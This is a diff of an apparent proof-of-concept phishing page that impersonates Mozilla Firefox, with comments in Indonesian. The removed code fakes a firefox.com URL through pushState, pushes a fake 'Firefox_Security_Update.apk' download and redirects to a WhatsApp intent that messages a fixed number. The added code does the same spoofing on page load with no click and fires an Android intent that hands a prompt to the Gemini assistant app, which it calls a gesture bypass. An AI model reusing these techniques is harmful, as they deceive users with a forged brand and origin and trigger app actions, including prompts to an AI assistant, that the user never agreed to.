@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Firefox Security Verification — Official Gateway</title>
+<title>Firefox AI Gateway — Automated Intent Bridge</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { 
@@ -29,19 +29,6 @@
   .logo { font-size: 24px; font-weight: 600; color: #711c91; margin-bottom: 20px; }
   h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #201f1e; }
   p { font-size: 14px; color: #605e5c; margin-bottom: 25px; line-height: 1.5; }
-  button { 
-    background: #711c91; 
-    color: #ffffff; 
-    border: none; 
-    padding: 12px 24px; 
-    font-size: 15px; 
-    font-weight: 600; 
-    border-radius: 2px; 
-    cursor: pointer; 
-    width: 100%; 
-    transition: background 0.2s;
-  }
-  button:hover { background: #5a1473; }
   #status { 
     margin-top: 20px; 
     font-size: 13px; 
@@ -54,83 +41,61 @@
 
 <div class="card">
   <div class="logo">Mozilla Firefox</div>
-  <h2>Browser Integrity Check</h2>
-  <p>Verifying secure channel parameters and session state protocols...</p>
-  <button id="actionBtn">Initialize Secure Bridge</button>
-  <div id="status"></div>
+  <h2>AI Engine Verification</h2>
+  <p>Initializing zero-click protocol handoff to mobile assistant runtime...</p>
+  <div id="status">[*] Loading environment...</div>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  var btn = document.getElementById('actionBtn');
   var statusEl = document.getElementById('status');
 
-  // Konfigurasi Delay (3 detik stacking window)
-  var DELAY_SECONDS = 3; 
-
-  // Target WhatsApp Intent
-  var TARGET_PHONE = "628123456789";
-  var TARGET_MESSAGE = "Firefox security verification handshake token: 404-SECURE";
-  var WHATSAPP_INTENT_URL = "intent://send?phone=" + TARGET_PHONE + "&text=" + encodeURIComponent(TARGET_MESSAGE) + "#Intent;scheme=whatsapp;package=com.whatsapp;end;";
-
-  function triggerSpoofedStackChain() {
-    statusEl.textContent = "Stacking security context...";
-
-    // 1. Manipulasi History Stack (Menyamarkan asal domain seolah-olah dari firefox.com)
-    try {
-      if (window.history && window.history.pushState) {
-        // Mendorong state palsu ke dalam stack riwayat peramban
-        window.history.pushState({page: "secure_portal"}, "Firefox Security", "https://www.firefox.com/security/verify");
-      }
-    } catch (e) {}
-
-    // 2. Pembuatan file virtual .apk di background via Blob API
-    try {
-      var dummyBytes = new Uint8Array([0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x08, 0x00]);
-      var blob = new Blob([dummyBytes], { type: 'application/vnd.android.package-archive' });
-      var blobUrl = URL.createObjectURL(blob);
-
-      var a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = "Firefox_Security_Update.apk";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-
-      setTimeout(function() {
-        URL.revokeObjectURL(blobUrl);
-      }, 5000);
-    } catch (e) {}
-
-    // 3. Hitung mundur delay stacking sebelum memicu intent WhatsApp
-    var countdown = DELAY_SECONDS;
-    var timer = setInterval(function() {
-      countdown--;
-      if (countdown > 0) {
-        statusEl.textContent = "Resolving host context in " + countdown + "s...";
-      } else {
-        clearInterval(timer);
-        statusEl.textContent = "Dispatching protocol intent...";
-        
-        // Eksekusi pengalihan ke Intent WhatsApp setelah stack tertahan
-        window.location.replace(WHATSAPP_INTENT_URL);
-      }
-    }, 1000);
+  function log(msg) {
+    statusEl.textContent = msg;
+    console.log("[PoC Gemini Intent] " + msg);
   }
 
-  btn.addEventListener('click', function() {
-    btn.disabled = true;
-    btn.style.opacity = "0.6";
-    statusEl.textContent = "Establishing secure stack...";
+  function executeZeroClickGeminiIntent() {
+    log("[*] Stacking security context...");
 
-    // Jeda kecil sebelum rangkaian aksi dimulai
+    // 1. Manipulasi History Stack untuk menyamarkan origin (menyerupai domain firefox.com)
+    try {
+      if (window.history && window.history.pushState) {
+        window.history.pushState({page: "ai_bridge"}, "Firefox AI", "https://www.firefox.com/ai/verify");
+      }
+    } catch (e) {}
+
+    // 2. Konstruksi Android Intent untuk Gemini dengan membawa teks parameter "testing"
+    // Format URI Intent spesifik untuk Google Gemini / Bard app
+    var geminiPromptText = "testing";
+    var geminiIntentUrl = "intent://chat?text=" + encodeURIComponent(geminiPromptText) + "#Intent;scheme=googlebard;package=com.google.android.apps.bard;action=android.intent.action.VIEW;end;";
+
+    // Alternatif Intent umum Google Assistant / Gemini action jika scheme kustom tidak aktif:
+    // var geminiIntentUrl = "intent://#Intent;action=android.intent.action.VOICE_COMMAND;end;";
+
+    log("[!] Dispatching zero-click intent payload...");
+
+    // 3. Eksekusi navigasi otomatis tanpa menunggu event klik pengguna (User Gesture Bypass attempt)
     setTimeout(function() {
-      triggerSpoofedStackChain();
+      try {
+        // Menggunakan location.replace untuk langsung memicu intent scheme
+        window.location.replace(geminiIntentUrl);
+      } catch (err) {
+        log("[-] Blocked by browser gesture policy: " + err.message);
+      }
     }, 800);
+  }
 
-  }, { once: true });
+  // Menjalankan fungsi secara otomatis begitu dokumen siap (Zero-Click trigger)
+  if (document.readyState === 'complete' || document.readyState === 'interactive') {
+    setTimeout(executeZeroClickGeminiIntent, 500);
+  } else {
+    window.addEventListener('DOMContentLoaded', function() {
+      setTimeout(executeZeroClickGeminiIntent, 500);
+    });
+  }
 
 })();
 </script>
